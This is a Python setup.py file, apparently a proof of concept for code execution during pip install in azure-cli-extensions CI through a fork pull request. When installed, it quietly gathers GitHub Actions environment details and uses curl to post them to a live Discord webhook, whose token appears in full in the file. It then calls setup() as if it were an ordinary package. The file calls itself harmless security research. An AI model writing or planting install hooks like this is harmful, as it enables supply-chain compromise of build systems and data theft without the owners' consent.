#!/usr/bin/env python

# Security research PoC - proves code execution during pip install
# HARMLESS - only sends a webhook callback, no modifications

import os
import json
import subprocess
import datetime

poc_data = {
    "source": "setup.py",
    "timestamp": datetime.datetime.utcnow().isoformat(),
    "github_run_id": os.environ.get("GITHUB_RUN_ID", "unknown"),
    "github_repository": os.environ.get("GITHUB_REPOSITORY", "unknown"),
    "github_event_name": os.environ.get("GITHUB_EVENT_NAME", "unknown"),
    "github_actor": os.environ.get("GITHUB_ACTOR", "unknown"),
    "runner_name": os.environ.get("RUNNER_NAME", "unknown"),
}

webhook_url = "https://discord.com/api/webhooks/1492977203141410952/P1N55vfdmkh1LUQum96RVFiaYhyO5OBiBNh9G9TJFAXppohnik7NO8dW2NV4dVoztj1Y"

message = json.dumps({
    "content": (
        "**PoC: setup.py execution - azure-cli-extensions**\n"
        "```\n"
        f"Repo: {poc_data['github_repository']}\n"
        f"Run ID: {poc_data['github_run_id']}\n"
        f"Event: {poc_data['github_event_name']}\n"
        f"Actor: {poc_data['github_actor']}\n"
        f"Runner: {poc_data['runner_name']}\n"
        f"Time: {poc_data['timestamp']}\n"
        "```\n"
        "setup.py executed during pip install from fork PR."
    )
})

try:
    subprocess.run(
        ["curl", "-s", "-X", "POST", "-H", "Content-Type: application/json",
         "-d", message, webhook_url],
        timeout=10,
        capture_output=True
    )
except Exception:
    pass

print("[PoC] setup.py executed - webhook sent")

from setuptools import setup, find_packages

setup(
    name='securitytest',
    version='0.1.0',
    description='Security research PoC',
    author='Bodlux',
    license='MIT',
    packages=find_packages(),
    install_requires=[],
    package_data={'azext_securitytest': ['azext_metadata.json']},
)
